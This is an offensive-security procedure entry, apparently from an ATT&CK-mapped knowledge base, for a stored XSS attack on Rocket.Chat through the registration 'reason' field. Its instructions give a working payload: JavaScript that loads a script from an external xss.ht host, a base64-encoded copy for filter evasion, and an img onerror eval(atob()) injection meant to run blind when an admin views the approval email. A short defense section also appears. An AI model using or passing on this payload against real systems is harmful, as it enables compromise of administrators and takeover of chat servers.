---
id: proc-rocket-chat-xss-injection-1
name: Inject-XSS-Payload-in-Rocket-Chat-Registration-Reason
tags:
  - xss
  - injection
  - rocket-chat
type: procedure
tools:
  - '[[tools/xss-ht]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:09.144Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-XSS-Payload-in-Rocket-Chat-Registration-Reason

## Summary

This procedure involves submitting a crafted XSS payload into the unsanitized reason field during user registration in Rocket.Chat, storing it for reflection in the admin approval email without immediate execution feedback.

## Description

In Rocket.Chat's `Accounts_Admin_Email_Approval_Needed_With_Reason_Default` action, the reason field lacks proper HTML escaping, allowing stored XSS. The payload is base64-encoded to evade basic filters and uses an img onerror to evaluate JS upon email rendering. This targets admins viewing emails in the Android client WebView, enabling blind exploitation.

## Requirements

1. Access to Rocket.Chat registration form (publicly available)
2. Control over an external domain like xss.ht for script hosting
3. Basic knowledge of JavaScript encoding (base64)

## Defense

Defensive measures and detection strategies:

- Implement HTML entity encoding for user inputs in email templates (e.g., using Meteor's Blaze escaping)
- Use Content-Security-Policy (CSP) in WebView to block external scripts
- Monitor for anomalous registrations with script-like reasons

## Objectives

1. Store malicious payload in backend without detection
2. Prepare for reflection in admin email
3. Achieve blind execution upon admin interaction

## Instructions

### Step 1: Craft and Encode Payload

**Context**: Create a JavaScript snippet that appends an external script tag, then base64-encode it for the img id.

The JS: `var a=document.createElement("script");a.src="https://2973956338.xss.ht";document.body.appendChild(a);`

Base64: `dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7`

Full payload: `"><img src="x" id="[base64]" onerror="eval(atob(this.id))"></b>`

### Step 2: Submit Registration

**Context**: Enter the payload in the reason field and complete registration.

Navigate to the registration page and submit the form with the payload in the reason input.

**Expected Output**: User account pending approval; payload stored.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/xss-ht]]

## Tags

- [[xss]]
- [[injection]]
